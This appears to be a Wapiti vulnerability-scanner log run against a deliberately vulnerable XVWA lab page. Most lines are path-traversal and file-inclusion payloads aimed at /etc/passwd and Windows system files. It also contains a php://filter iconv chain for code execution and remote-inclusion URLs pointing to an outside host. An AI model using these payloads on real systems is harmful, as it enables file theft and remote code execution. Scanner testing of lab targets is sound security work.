+	data: search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&item=10
+2024-03-20 15:24:18.451 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 15:24:18.462 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 15:24:18.473 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%2Fetc%2Fpasswd
+2024-03-20 15:24:18.487 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%2Fetc%2Fpasswd%00
+2024-03-20 15:24:18.500 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%2Fetc%2Fservices
+2024-03-20 15:24:18.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=%2Fetc%2Fservices%00
+2024-03-20 15:24:18.527 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 15:24:18.538 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 15:24:18.548 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 15:24:18.559 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:18.570 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:18.581 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 15:24:18.592 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 15:24:18.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 15:24:18.615 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:18.627 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:18.637 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:18.645 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:18.654 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:18.663 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:18.672 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:18.683 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:18.692 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:18.702 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:18.711 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:18.724 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:18.737 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 15:24:18.749 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:18.761 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:18.776 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:18.786 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:18.795 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:18.806 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:18.819 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:18.829 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:18.843 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:18.855 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:18.866 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:18.875 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:18.885 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:18.898 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 15:24:18.910 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:18.923 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 15:24:18.933 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:18.942 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 15:24:18.952 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:18.963 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 15:24:18.977 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:18.988 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:19.001 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:19.010 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:19.021 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 15:24:19.031 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 15:24:19.041 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 15:24:19.053 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 15:24:19.063 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 15:24:19.071 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 15:24:19.081 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 15:24:19.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 15:24:19.123 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 15:24:19.135 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:19.142 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 15:24:19.217 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 15:24:19.231 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:19.244 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 15:24:19.244 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 15:24:19.292 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 15:24:19.292 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 15:24:19.365 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 15:24:19.376 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:19.400 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:19.421 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:19.485 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 15:24:19.509 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//sqli_item.json/
+2024-03-20 15:24:19.509 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//sqli_item.json/web_03202024_1524.html with a browser to see this report.
